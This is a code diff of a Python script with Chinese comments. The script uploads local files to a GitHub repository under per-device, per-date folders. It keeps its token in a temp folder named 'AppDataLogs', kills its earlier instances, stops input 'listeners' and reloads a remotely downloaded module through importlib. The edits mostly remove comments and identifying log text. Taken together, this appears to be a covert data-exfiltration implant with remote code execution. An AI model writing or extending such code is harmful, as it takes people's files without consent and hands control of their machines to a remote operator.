@@ -15,7 +15,7 @@ import requests
 
 DEVICE_NAME = socket.gethostname()
 
-# 使用系统通用临时目录，避免无 D 盘或权限不足引发崩溃
+# 全局兼容路径配置
 BASE_DIR = os.path.join(tempfile.gettempdir(), "AppDataLogs")
 SAVE_DIR = os.path.join(BASE_DIR, "Cache")
 TOKEN_FILE_PATH = os.path.join(BASE_DIR, "token.txt")
@@ -66,12 +66,6 @@ def kill_previous_instances():
 
 
 def extract_date_from_filename(file_name):
-    """
-    提取日期并转换为 M.D (如 9.9) 格式：
-    1. 匹配 20260909 格式 -> 9.9
-    2. 匹配 2026-09-09 格式 -> 9.9
-    3. 未匹配到则默认使用当前系统日期的 M.D 格式
-    """
     match1 = re.search(r'\b20\d{2}(\d{2})(\d{2})\b', file_name)
     if match1:
         return f"{int(match1.group(1))}.{int(match1.group(2))}"
@@ -90,14 +84,13 @@ def upload_file_smart(file_path):
 
     token = get_active_token()
     if not token:
-        write_txt("同步失败", f"未找到有效 Token，请检查 Token 路径: {TOKEN_FILE_PATH}")
+        write_txt("同步失败", "未找到有效 Token")
         return False
 
     file_name = os.path.basename(file_path)
     device_folder = DEVICE_NAME
     date_folder = extract_date_from_filename(file_name)
 
-    # 路径架构：uploads / 设备名称 / 月.日 (例如 9.9) / 文件名
     target_path = f"uploads/{device_folder}/{date_folder}/{file_name}"
     base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{target_path}"
     
@@ -108,7 +101,6 @@ def upload_file_smart(file_path):
     }
 
     try:
-        # 检查云端是否已存在该文件，避免重复上传
         get_res = requests.get(base_url, headers=headers, timeout=10)
         if get_res.status_code == 200:
             uploaded_files.add(file_name)
@@ -126,7 +118,7 @@ def upload_file_smart(file_path):
         response = requests.put(base_url, headers=headers, json=data, timeout=20)
         if response.status_code in [200, 201]:
             uploaded_files.add(file_name)
-            write_txt("同步", f"成功上传文件到 JL 仓库 [{device_folder}/{date_folder}]: {file_name}")
+            write_txt("同步", f"成功上传文件 [{device_folder}/{date_folder}]: {file_name}")
             return True
         else:
             write_txt("同步失败", f"状态码: {response.status_code} | 详情: {response.text}")
@@ -245,10 +237,8 @@ def auto_update_loop(token):
                 write_txt("系统", "正在重载新版模块...")
 
                 for listener in running_listeners:
-                    try:
-                        listener.stop()
-                    except Exception:
-                        pass
+                    try: listener.stop()
+                    except Exception: pass
                 running_listeners.clear()
 
                 spec = importlib.util.spec_from_file_location("remote_main", cache_path)
@@ -262,18 +252,9 @@ def auto_update_loop(token):
 
 
 def run(*args, **kwargs):
-    """
-    修改为支持可变参数结构，适配主客户端调用: remote_module.run(token)
-    """
     kill_previous_instances()
 
-    # 提取位置参数或关键字参数中的 Token
-    token = None
-    if args:
-        token = args[0]
-    elif "token" in kwargs:
-        token = kwargs["token"]
-
+    token = args[0] if args else kwargs.get("token", None)
     if token:
         GITHUB_CONFIG["token"] = token
 
@@ -299,11 +280,13 @@ def run(*args, **kwargs):
     update_thread = threading.Thread(target=auto_update_loop, args=(get_active_token(),), daemon=True)
     update_thread.start()
 
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        write_txt("停止", "手动终止")
+    # 仅在独立模式运行时进入死循环，防止卡死 PyQt 引擎
+    if __name__ == "__main__":
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            write_txt("停止", "手动终止")
 
 
 if __name__ == "__main__":
